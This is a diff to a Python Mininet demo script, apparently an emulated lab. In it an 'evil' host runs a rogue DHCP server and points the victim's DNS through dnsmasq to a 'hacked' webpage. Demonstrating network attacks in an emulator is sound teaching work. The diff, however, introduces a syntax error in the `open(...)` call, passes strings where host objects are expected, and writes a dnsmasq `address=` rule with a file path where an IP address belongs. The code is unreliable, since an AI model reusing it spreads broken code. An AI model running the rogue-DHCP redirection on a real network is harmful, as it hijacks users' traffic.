@@ -60,7 +60,7 @@ def make_dhcp_config( filename, intf, gw, dns ):
         'option router %s' % gw,
         'option dns %s' % dns,
         '' )
-    with open( filename, 'w' ) as f:
+    with open( filename, 'w' as f:
         f.write( '\n'.join( config ) )
 
 def start_dhcp_server( host, gw, dns ):
@@ -75,6 +75,7 @@ def stop_dhcp_server( host ):
     "Stop DHCP server on host"
     info( '* Stopping DHCP server on', host, 'at', host.IP(), '\n' )
     host.cmd( 'kill %udhcpd' )
+
 
 def hacked_webpage(path):
     """Creates a simple HTML file that displays a "hacked" message"""
@@ -93,4 +94,36 @@ def run_demo():
 
     # Configure evil host as DNS server (redirecting to hacked webpage)
     evil_dir = '/var/www/html/evil'  # Directory for hacked webpage
-    evil.cmd('apt-get install -y dnsmasq')  
+    evil.cmd('apt-get install -y dnsmasq')  # Ensure dnsmasq is installed on evil
+    evil.cmd('mkdir -p ' + evil_dir)  # Create directory for webpage
+    hacked_webpage(evil_dir + '/index.html')  # Create hacked webpage
+    evil.cmd('echo "address=/.evil/ ' + evil_dir + '/index.html" >> /etc/dnsmasq.conf')  # Redirect DNS to hacked page
+    evil.cmd('service dnsmasq restart')  # Restart dnsmasq with new config
+
+    # Start the network
+    net.build()
+    net.start()
+
+    # User Interaction
+    print( "Network started. h1 (victim) has no internet yet." )
+    print( "h1 can access the internet before the attack (e.g., try pinging 8.8.8.8)" )
+    input("Press Enter to simulate DHCP request from h1 and launch the attack...")
+
+    # Start DHCP servers (legitimate and evil)
+    start_dhcp_server( 'dhcp', '192.168.1.1', '8.8.8.8' )  # Legitimate DHCP with external DNS
+    start_dhcp_server( 'evil', '192.168.1.1', '192.168.1.66' )  # Evil DHCP with evil DNS
+
+    print( "h1 should now have internet access (evil DNS server in control)." )
+    print( "h1 will be redirected to a 'hacked' webpage when trying to browse (e.g., try curl amazon.com)" )
+    input("Press Enter to stop the network...")
+
+    # Stop DHCP servers and clean up
+    stop_dhcp_server( 'dhcp' )
+    stop_dhcp_server( 'evil' )
+    evil.cmd('rm -rf ' + evil_dir)  # Remove hacked webpage directory
+    evil.cmd('service dnsmasq stop')  # Stop dnsmasq
+    net.stop()
+
+if __name__ == '__main__':
+    run_demo()
+
